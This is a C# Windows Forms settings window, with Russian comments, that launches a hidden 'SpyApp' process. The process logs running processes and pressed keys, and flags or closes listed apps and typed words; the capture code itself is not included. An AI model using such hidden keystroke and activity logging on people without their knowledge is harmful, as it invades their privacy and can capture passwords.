using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using SpyAppClasses;

namespace SpySettings
{
    //основное окно (настройки и запуск SpyApp или StatsApp)
    public partial class Form_spySettings : Form
    {
        //сюда мы запишем то, что выбрал пользователь
        //и передадим в SpyApp
        private SpyInfo _spyInfo;
        private Process _procSpyApp;
        private string _spyAppName;

        private Process _procStatsApp;
        private string _statsAppName;
        private bool _isOpen = true;
        public Form_spySettings()
        {
            InitializeComponent();

            _spyInfo = new SpyInfo();

            string thisAppPath = Path.GetDirectoryName(
                Assembly.GetEntryAssembly().Location);

            _spyAppName = "SpyApp";
            string spyAppPath = thisAppPath + "\\" + _spyAppName + ".exe";

            _procSpyApp = new Process();
            _procSpyApp.StartInfo = new ProcessStartInfo(spyAppPath);
            _procSpyApp.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

            _statsAppName = "SpyStats";
            string statsAppPath = thisAppPath + "\\" + _statsAppName + ".exe";
            _procStatsApp = new Process();
            _procStatsApp.StartInfo = new ProcessStartInfo(statsAppPath);

            Thread spyAppStatus = 
                new Thread(new ThreadStart(SpyAppProcStatus));
            spyAppStatus.Start();

            this.FormClosed += Form_spySettings_FormClosed;
        }

        private void Form_spySettings_FormClosed(object sender, FormClosedEventArgs e)
        {
            _isOpen = false;
        }

        private void SpyAppProcStatus()
        {
            while (_isOpen)
            {
                if (Process.GetProcesses()
                    .Any(p => p.ProcessName == _spyAppName))
                {
                    label_onOff.Text = "SPY ON";
                    label_onOff.BackColor = Color.DarkGreen;
                }
                else
                {
                    label_onOff.Text = "SPY OFF";
                    label_onOff.BackColor = Color.DarkRed;
                }
            }
        }
        private void button_start_spy_Click(object sender, EventArgs e)
        {
            //тут запускаем SpyApp

            //проверяем вдруг файл отсутствует
            if (!File.Exists(_procSpyApp.StartInfo.FileName)) 
            {
                MessageBox.Show("SpyApp.exe not founded!");
                return;
            }              

            //проверяем вдруг SpyApp.exe уже запущен
            if (Process.GetProcesses()
                .Any(p => p.ProcessName == _spyAppName))
            {
                MessageBox.Show("SpyApp.exe already runned!");
                return;
            }
            var args = _spyInfo.SerializeToString();

            _procSpyApp.StartInfo.Arguments = args;
            //запускаем сам процесс
            _procSpyApp.Start();
        }

        private void button_start_stats_Click(object sender, EventArgs e)
        {
            //тут запускаем StatsApp и передаем ему пути с отчетами
            //textBox_stats_report
            //textBox_mod_report
            if (!File.Exists(_procStatsApp.StartInfo.FileName))
            {
                MessageBox.Show("SpyStats.exe not founded!");
                return;
            }

            //проверяем вдруг SpyApp.exe уже запущен
            if (Process.GetProcesses()
                .Any(p => p.ProcessName == _statsAppName))
            {
                MessageBox.Show("SpyStats.exe already runned!");
                return;
            }
            
            var args = _spyInfo.SerializeToString();

            _procStatsApp.StartInfo.Arguments = args;
            //запускаем сам процесс
            _procStatsApp.Start();
        }

        private void button_stop_spy_Click(object sender, EventArgs e)
        {
            var spyProcesses = Process.GetProcesses()
                .Where(p => p.ProcessName == _spyAppName)
                .ToList();

            if (spyProcesses.Count == 0)
                MessageBox.Show("Spy app doesnt runned!");

            foreach (var p in spyProcesses)
                p.Kill();
        }

        private void FileDialog(object sender, EventArgs e)
        {
            using(OpenFileDialog fd=new OpenFileDialog())
            {
                if (fd.ShowDialog() == DialogResult.OK)
                {
                    string filePath = fd.FileName;
                   
                    switch((sender as Button).Name)
                    {
                        case "button_proc_report":
                            textBox_proc_report.Text = filePath;
                            break;
                        case "button_keys_report":
                            textBox_keys_report.Text = filePath;
                            break;
                        case "button_bad_apps":
                            textBox_bad_apps.Text = filePath;
                            break;
                        case "button_bad_words":
                            textBox_bad_words.Text = filePath;
                            break;
                        case "button_badWords_report":
                            textBox_badWords_report.Text = filePath;
                            break;
                        case "button_badProc_report":
                            textBox_badProc_report.Text = filePath;
                            break;
                    }
                }
            }
        }

        private void checkBox_proc_report_CheckedChanged(object sender, EventArgs e)
        {
            textBox_proc_report.Enabled = checkBox_proc_report.Checked;
            textBox_proc_report.Text = "runnedProcs.txt";
            button_proc_report.Enabled = checkBox_proc_report.Checked;
        }
        private void checkBox_keys_report_CheckedChanged(object sender, EventArgs e)
        {
            textBox_keys_report.Enabled = checkBox_keys_report.Checked;
            textBox_keys_report.Text = "pressedKeys.txt";
            button_keys_report.Enabled = checkBox_keys_report.Checked;
        }
        private void checkBox_proc_analys_CheckedChanged(object sender, EventArgs e)
        {
            textBox_bad_apps.Enabled = checkBox_proc_analys.Checked;
            textBox_bad_apps.Text = "";
            button_bad_apps.Enabled = checkBox_proc_analys.Checked;

            textBox_badProc_report.Enabled = checkBox_proc_analys.Checked;
            textBox_badProc_report.Text = "runnedBadProcs.txt";
            button_badProc_report.Enabled = checkBox_proc_analys.Checked;

            radioButton_badApp_close.Enabled = checkBox_proc_analys.Checked;
            radioButton_badApp_stats.Enabled = checkBox_proc_analys.Checked;
        }
        private void checkBox_keys_analys_CheckedChanged(object sender, EventArgs e)
        {
            textBox_bad_words.Enabled = checkBox_keys_analys.Checked;
            textBox_bad_words.Text = "";
            button_bad_words.Enabled = checkBox_keys_analys.Checked;
            textBox_badWords_report.Enabled = checkBox_keys_analys.Checked;
            textBox_badWords_report.Text = "typedBadWords.txt";
            button_badWords_report.Enabled = checkBox_keys_analys.Checked;
        }

        private void textBox_proc_report_TextChanged(object sender, EventArgs e)
        {
            _spyInfo.WhereToWriteProcs = textBox_proc_report.Text;
        }
        private void textBox_keys_report_TextChanged(object sender, EventArgs e)
        {
            _spyInfo.WhereToWriteKeys = textBox_keys_report.Text;
        }
        private void textBox_bad_apps_TextChanged(object sender, EventArgs e)
        {
            _spyInfo.WhereToReadBadApps = textBox_bad_apps.Text;
        }

        private void radioButton_badApp_close_CheckedChanged(object sender, EventArgs e)
        {
            _spyInfo.IsCloseBadApp = radioButton_badApp_close.Checked;
        }

        private void radioButton_badApp_stats_CheckedChanged(object sender, EventArgs e)
        {
            _spyInfo.IsCloseBadApp = !radioButton_badApp_stats.Checked;
        }

        private void textBox_bad_words_TextChanged(object sender, EventArgs e)
        {
            _spyInfo.WhereToReadBadWords = textBox_bad_words.Text;
        }

        private void textBox_badWords_report_TextChanged(object sender, EventArgs e)
        {
            _spyInfo.WhereToWriteWords = textBox_badWords_report.Text;
        }

        private void textBox_badProc_report_TextChanged(object sender, EventArgs e)
        {
            _spyInfo.WhereToWriteBadProcs = textBox_badProc_report.Text;
        }
    }
}
